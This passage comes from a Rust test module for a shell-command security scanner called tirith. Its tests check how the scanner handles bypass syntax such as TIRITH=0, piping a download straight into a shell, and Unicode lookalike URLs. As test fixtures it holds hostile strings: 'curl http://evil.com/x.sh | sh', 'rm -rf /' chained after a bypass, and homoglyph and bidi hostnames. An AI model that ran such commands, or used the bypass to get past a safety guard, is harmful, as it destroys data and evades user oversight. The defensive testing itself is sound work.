        assert_eq!(
            verdict.findings.len(),
            1,
            "paranoia 2 should keep only Medium+"
        );
    }

    #[test]
    fn test_inline_bypass_bare_prefix() {
        assert!(find_inline_bypass(
            "TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_wrapper() {
        assert!(find_inline_bypass(
            "env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_i() {
        assert!(find_inline_bypass(
            "env -i TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_u_skip() {
        assert!(find_inline_bypass(
            "env -u TIRITH TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_usr_bin_env() {
        assert!(find_inline_bypass(
            "/usr/bin/env TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_dashdash() {
        assert!(find_inline_bypass(
            "env -- TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_no_inline_bypass() {
        assert!(!find_inline_bypass(
            "curl evil.com | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env() {
        assert!(find_inline_bypass(
            "$env:TIRITH=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env_no_quotes() {
        assert!(find_inline_bypass(
            "$env:TIRITH=0; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env_single_quotes() {
        assert!(find_inline_bypass(
            "$env:TIRITH='0'; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_env_spaced() {
        assert!(find_inline_bypass(
            "$env:TIRITH = \"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_powershell_mixed_case_env() {
        assert!(find_inline_bypass(
            "$Env:TIRITH=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_wrong_value() {
        assert!(!find_inline_bypass(
            "$env:TIRITH=\"1\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_other_var() {
        assert!(!find_inline_bypass(
            "$env:FOO=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_in_posix_mode() {
        // PowerShell syntax should NOT match when shell is Posix
        assert!(!find_inline_bypass(
            "$env:TIRITH=\"0\"; curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_no_inline_bypass_powershell_comment_contains_bypass() {
        assert!(!find_inline_bypass(
            "curl evil.com # $env:TIRITH=0",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_env_c_flag() {
        // env -C takes a directory arg; TIRITH=0 should still be found after it
        assert!(find_inline_bypass(
            "env -C /tmp TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_s_flag() {
        // env -S takes a string arg; TIRITH=0 should still be found after it
        assert!(find_inline_bypass(
            "env -S 'some args' TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_env_ignore_environment_long_flag() {
        assert!(find_inline_bypass(
            "env --ignore-environment TIRITH=0 curl evil.com",
            ShellType::Posix
        ));
    }

    // -----------------------------------------------------------------------
    // #78 / #30: pipe-bypass contract
    //
    // README.md:539 and TIRITH.md:804 document `TIRITH=0 <cmd> | <interp>` as a
    // supported whole-line bypass. cdbe48f (the #30 hardening) overshot and
    // rejected all multi-segment input, which regressed the documented shape.
    // find_inline_bypass now distinguishes pipe pipelines (shared-bypass shape)
    // from sequencing chains (bypass must NOT apply to the second command).
    // -----------------------------------------------------------------------

    #[test]
    fn test_inline_bypass_allows_pipe_to_sh() {
        // Exact README.md:539 example.
        assert!(find_inline_bypass(
            "TIRITH=0 curl -L https://something.xyz | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_allows_pipe_to_interpreter() {
        assert!(find_inline_bypass(
            "TIRITH=0 curl -sSL https://install.python-poetry.org | python3 -",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_allows_env_wrapper_with_pipe() {
        assert!(find_inline_bypass(
            "env TIRITH=0 curl https://example.com | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_allows_multi_pipe_chain() {
        // Multiple pipe stages — all still shared bypass.
        assert!(find_inline_bypass(
            "TIRITH=0 curl https://example.com | jq . | bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_rejects_sequence_with_and_and() {
        // `&&` creates a new command with a new env — bypass must NOT apply.
        assert!(!find_inline_bypass(
            "TIRITH=0 curl https://example.com && rm -rf /",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_rejects_semicolon_chain() {
        assert!(!find_inline_bypass(
            "TIRITH=0 ls ; rm -rf /",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_rejects_or_or() {
        assert!(!find_inline_bypass(
            "TIRITH=0 ls || rm -rf /",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_rejects_backgrounding_ampersand() {
        // Unquoted `&` is a separate-command boundary handled by has_unquoted_ampersand.
        assert!(!find_inline_bypass(
            "TIRITH=0 curl evil.com & bash",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_allows_pipe_to_sh_fish() {
        // Fish tokenization delegates to posix; same contract applies.
        assert!(find_inline_bypass(
            "TIRITH=0 curl -L https://example.com | bash",
            ShellType::Fish
        ));
    }

    #[test]
    fn test_paranoia_filter_recalculates_action() {
        use crate::verdict::{Action, Finding, RuleId, Severity, Timings, Verdict};

        let findings = vec![
            Finding {
                rule_id: RuleId::InvisibleWhitespace,
                severity: Severity::Low,
                title: "low finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
            Finding {
                rule_id: RuleId::HiddenCssContent,
                severity: Severity::Medium,
                title: "medium finding".into(),
                description: String::new(),
                evidence: vec![],
                human_view: None,
                agent_view: None,
                mitre_id: None,
                custom_rule_id: None,
            },
        ];

        let timings = Timings {
            tier0_ms: 0.0,
            tier1_ms: 0.0,
            tier2_ms: None,
            tier3_ms: None,
            total_ms: 0.0,
        };

        // Before paranoia filter: action should be Warn (Medium max)
        let mut verdict = Verdict::from_findings(findings, 3, timings);
        assert_eq!(verdict.action, Action::Warn);

        // After paranoia filter at level 1: Low is removed, only Medium remains → still Warn
        filter_findings_by_paranoia(&mut verdict, 1);
        assert_eq!(verdict.action, Action::Warn);
        assert_eq!(verdict.findings.len(), 1);
    }

    #[test]
    fn test_powershell_bypass_case_insensitive_tirith() {
        // PowerShell env vars are case-insensitive
        assert!(find_inline_bypass(
            "$env:tirith=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
        assert!(find_inline_bypass(
            "$ENV:Tirith=\"0\"; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_powershell_bypass_no_panic_on_multibyte() {
        // Multi-byte UTF-8 after $ should not panic
        assert!(!find_inline_bypass(
            "$a\u{1F389}xyz; curl evil.com",
            ShellType::PowerShell
        ));
        assert!(!find_inline_bypass(
            "$\u{00E9}nv:TIRITH=0; curl evil.com",
            ShellType::PowerShell
        ));
    }

    #[test]
    fn test_inline_bypass_single_quoted_value() {
        assert!(find_inline_bypass(
            "TIRITH='0' curl evil.com",
            ShellType::Posix
        ));
    }

    #[test]
    fn test_inline_bypass_double_quoted_value() {
        assert!(find_inline_bypass(
            "TIRITH=\"0\" curl evil.com",
            ShellType::Posix
        ));
    }

    // -----------------------------------------------------------------------
    // #29: tirith inspection subcommands (`tirith diff/score/why/receipt/explain`)
    // must not trip URL or Unicode-style rules on their own arguments, because
    // the user explicitly typed those arguments to have them inspected.
    // `tirith run` and non-inspection subcommands are unaffected.
    // -----------------------------------------------------------------------

    #[test]
    fn test_tirith_run_still_acts_as_sink() {
        // `tirith run` IS on the sink list — URL-to-sink rules must still fire.
        // (Renamed from test_tirith_command_is_analyzed_like_any_other_exec
        // which was misleading once the inert carveout landed.)
        let ctx = exec_ctx("tirith run http://example.com");
        let verdict = analyze(&ctx);
        assert!(verdict.tier_reached >= 3);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::PlainHttpToSink)),
            "tirith run http://... should surface sink findings"
        );
    }

    fn exec_ctx(input: &str) -> AnalysisContext {
        AnalysisContext {
            input: input.to_string(),
            shell: ShellType::Posix,
            scan_context: ScanContext::Exec,
            raw_bytes: None,
            interactive: true,
            cwd: None,
            file_path: None,
            repo_root: None,
            is_config_override: false,
            clipboard_html: None,
        }
    }

    #[test]
    fn test_tirith_inspection_suppresses_url_rules() {
        // Cyrillic 'а' inside a URL arg must NOT trip URL-derived findings
        // (non_ascii_hostname, mixed_script_in_label, punycode_domain) when
        // passed to an inspection subcommand.
        for sub in ["diff", "score", "why", "receipt", "explain"] {
            let input = format!("tirith {sub} https://ex\u{0430}mple.com");
            let verdict = analyze(&exec_ctx(&input));
            assert!(
                verdict.action == crate::verdict::Action::Allow,
                "tirith {sub} with cyrillic URL should allow, got {:?}: {:?}",
                verdict.action,
                verdict
                    .findings
                    .iter()
                    .map(|f| f.rule_id.to_string())
                    .collect::<Vec<_>>()
            );
        }
    }

    #[test]
    fn test_tirith_inspection_suppresses_confusable_and_bidi() {
        // The exec-context byte scan (engine.rs:418 + :587) must also respect
        // the inert range so ConfusableText / BidiControls / etc. are not
        // emitted from inside the inspection arg span.
        let input = "tirith score https://ex\u{0430}mple.com/\u{202E}bar";
        let verdict = analyze(&exec_ctx(input));
        for f in &verdict.findings {
            assert!(
                !matches!(
                    f.rule_id,
                    crate::verdict::RuleId::ConfusableText | crate::verdict::RuleId::BidiControls
                ),
                "tirith score arg span must not surface {:?}",
                f.rule_id
            );
        }
    }

    #[test]
    fn test_tirith_inspection_with_pipe_still_analyzes_rest() {
        // Later pipeline segments must still be analyzed normally.
        let ctx = exec_ctx("tirith diff foo | curl http://evil.com/x.sh | sh");
        let verdict = analyze(&ctx);
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::PlainHttpToSink)),
            "later pipe segments must still fire plain_http_to_sink"
        );
    }

    #[test]
    fn test_tirith_inspection_with_leading_flag() {
        // `tirith --quiet diff URL` — flag before subcommand must not defeat the carveout.
        let input = "tirith --quiet diff https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_eq!(verdict.action, crate::verdict::Action::Allow);
    }

    #[test]
    fn test_tirith_doctor_not_on_inert_list() {
        // Regression guard: adding a subcommand to the inert list requires a
        // motivating fixture. `doctor` is NOT on the list; URL rules still fire.
        let input = "tirith doctor https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_ne!(
            verdict.action,
            crate::verdict::Action::Allow,
            "tirith doctor with cyrillic URL SHOULD still flag (not on inert list); \
             adding `doctor` to the list requires a motivating false-positive fixture"
        );
    }

    #[test]
    fn test_tirith_run_bidi_in_url_still_fires() {
        // `tirith run` is a sink, not on the inspection list. Bidi in its URL
        // arg must still fire.
        let input = "tirith run https://evil\u{202E}.com/x.sh";
        let verdict = analyze(&exec_ctx(input));
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::BidiControls)),
            "bidi in `tirith run` URL must still fire"
        );
    }

    #[test]
    fn test_tirith_inert_arg_range_covers_expected_span() {
        // Unit test directly on the helper: range covers everything after the
        // subcommand word within the first segment.
        let input = "tirith diff https://ex\u{0430}mple.com";
        let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
        // "tirith diff" is 11 bytes; arg span starts at byte 11 and runs to end.
        assert_eq!(&input[range.clone()], " https://ex\u{0430}mple.com");
        assert_eq!(range.end, input.len());
    }

    #[test]
    fn test_tirith_inert_arg_range_none_for_run() {
        // `tirith run` is NOT on the inspection list.
        let range =
            extract::tirith_inert_arg_range("tirith run http://example.com", ShellType::Posix);
        assert!(range.is_none());
    }

    #[test]
    fn test_tirith_inert_arg_range_none_for_non_tirith() {
        assert!(
            extract::tirith_inert_arg_range("curl https://example.com", ShellType::Posix).is_none()
        );
    }

    #[test]
    fn test_tirith_inert_arg_range_pipe_only_first_segment() {
        // Second segment is outside the inert range.
        let input = "tirith diff foo | curl http://evil.com";
        let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
        assert!(range.end < input.len());
        assert!(!input[range.clone()].contains("curl"));
    }

    // -----------------------------------------------------------------------
    // #29 review corrections: UnicodeTags leak, sudo wrapper, env URLs, flag
    // subcommand name false match.
    // -----------------------------------------------------------------------

    #[test]
    fn test_tirith_inspection_suppresses_unicode_tags_evidence_text() {
        // UnicodeTags emits Evidence::Text, not Evidence::ByteSequence — an
        // offset-only post-filter would miss it. The carveout must suppress
        // the rule AT SCAN TIME (inside check_bytes_with_ignore) based on
        // whether the unicode-tag byte actually lives in the inert range.
        //
        // Input: unicode-tag char in the diff's URL arg only. In exec mode,
        // this bye should be treated as inert and UnicodeTags must not fire.
        let input = "tirith diff https://example.com/\u{E0041}";
        let verdict = analyze(&exec_ctx(input));
        assert!(
            !verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::UnicodeTags)),
            "UnicodeTags inside tirith diff arg must be suppressed, got findings: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| f.rule_id.to_string())
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_tirith_inspection_unicode_tags_outside_still_fires() {
        // If a unicode-tag byte appears BEFORE "tirith diff" in the command,
        // it's outside the inert range and UnicodeTags must still fire.
        // Env-assignment value is a convenient carrier for this.
        let input = "FOO=\u{E0041}\u{E0042} tirith diff safe";
        let verdict = analyze(&exec_ctx(input));
        assert!(
            verdict
                .findings
                .iter()
                .any(|f| matches!(f.rule_id, crate::verdict::RuleId::UnicodeTags)),
            "UnicodeTags before tirith diff must still fire, got findings: {:?}",
            verdict
                .findings
                .iter()
                .map(|f| f.rule_id.to_string())
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_tirith_inspection_with_sudo_wrapper() {
        // `sudo tirith diff URL` must resolve through the sudo wrapper and
        // treat the URL as inert. Before the #29-review fix the resolver had
        // no sudo case, so this path regressed.
        let input = "sudo tirith diff https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_eq!(
            verdict.action,
            crate::verdict::Action::Allow,
            "sudo tirith diff <cyrillic-url> must be allowed, got {:?}: {:?}",
            verdict.action,
            verdict
                .findings
                .iter()
                .map(|f| f.rule_id.to_string())
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_tirith_inspection_with_sudo_u_flag() {
        // `sudo -u root tirith diff URL` — sudo takes a value for -u.
        let input = "sudo -u root tirith diff https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_eq!(verdict.action, crate::verdict::Action::Allow);
    }

    #[test]
    fn test_tirith_inspection_env_assignment_url_still_analyzed() {
        // `FOO=https://evil.com tirith diff safe-arg` — the URL in the env
        // assignment is OUTSIDE the inspection arg span and must still be
        // analyzed. Before the #29-review fix this was silently skipped.
        let input = "FOO=http://evil.com tirith diff safe";
        let verdict = analyze(&exec_ctx(input));
        // The http URL in FOO= is schemeless-analysis territory — assert it
        // at minimum surfaces as a finding (details depend on rules layer).
        let urls = verdict.urls_extracted_count.unwrap_or(0);
        assert!(
            !verdict.findings.is_empty() || urls > 0,
            "env-assignment URL must still be extracted/analyzed, got {:?}",
            verdict
        );
    }

    #[test]
    fn test_tirith_inspection_with_sudo_dash_s_boolean_flag() {
        // `-S` is a BOOLEAN sudo flag (read password from stdin). The first
        // fix erroneously listed it among value-taking flags, which made
        // `sudo -S tirith diff URL` skip over `tirith` and resolve `diff`
        // itself as the command. Regression guard — exit should be Allow.
        let input = "sudo -S tirith diff https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_eq!(
            verdict.action,
            crate::verdict::Action::Allow,
            "sudo -S tirith diff must still allow; got {:?}: {:?}",
            verdict.action,
            verdict
                .findings
                .iter()
                .map(|f| f.rule_id.to_string())
                .collect::<Vec<_>>()
        );
    }

    #[test]
    fn test_tirith_inspection_with_sudo_dash_a_boolean_flag() {
        // Same regression class for `-A` (askpass).
        let input = "sudo -A tirith diff https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_eq!(verdict.action, crate::verdict::Action::Allow);
    }

    #[test]
    fn test_tirith_inspection_with_sudo_dash_b_boolean_flag() {
        // Same regression class for `-B` (ring bell).
        let input = "sudo -B tirith diff https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_eq!(verdict.action, crate::verdict::Action::Allow);
    }

    #[test]
    fn test_tirith_inspection_with_doas_wrapper() {
        // `doas` is an alias for sudo; same resolver branch.
        let input = "doas tirith diff https://ex\u{0430}mple.com";
        let verdict = analyze(&exec_ctx(input));
        assert_eq!(verdict.action, crate::verdict::Action::Allow);
    }

    #[test]
    fn test_tirith_inert_arg_range_no_false_match_inside_flag_value() {
        // `tirith --config=diff diff URL` — naive substring search for "diff"
        // would match inside `--config=diff` and produce a too-wide inert
        // range. `find_subcommand_token` must require a whitespace boundary.
        let input = "tirith --config=diff diff https://example.com";
        let range = extract::tirith_inert_arg_range(input, ShellType::Posix).unwrap();
        // The inert range must start AFTER the second "diff" word, not the
        // first occurrence inside --config=diff.
        let inert_slice = &input[range.clone()];
        assert!(
            inert_slice.contains("https://example.com"),
            "inert range should cover the URL, got: {inert_slice:?}"
        );
        assert!(
            !inert_slice.contains("diff diff"),
            "inert range should not start inside the flag value: {inert_slice:?}"
        );
    }

    #[test]
    fn test_cmd_bypass_bare_set() {
        // `set TIRITH=0 & cmd` is a real Cmd bypass
        assert!(find_inline_bypass(
            "set TIRITH=0 & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_bypass_whole_token_quoted() {
        // `set "TIRITH=0" & cmd` — whole-token quoting, real bypass
        assert!(find_inline_bypass(
            "set \"TIRITH=0\" & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_no_bypass_inner_double_quotes() {
        // `set TIRITH="0" & cmd` — cmd.exe stores literal "0", NOT a bypass
        assert!(!find_inline_bypass(
            "set TIRITH=\"0\" & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_no_bypass_single_quotes() {
        // `set TIRITH='0' & cmd` — single quotes are literal in cmd.exe, NOT a bypass
        assert!(!find_inline_bypass(
            "set TIRITH='0' & curl evil.com",
            ShellType::Cmd
        ));
    }

    #[test]
    fn test_cmd_no_bypass_wrong_value() {
        assert!(!find_inline_bypass(
            "set TIRITH=1 & curl evil.com",
            ShellType::Cmd
        ));
    }
}
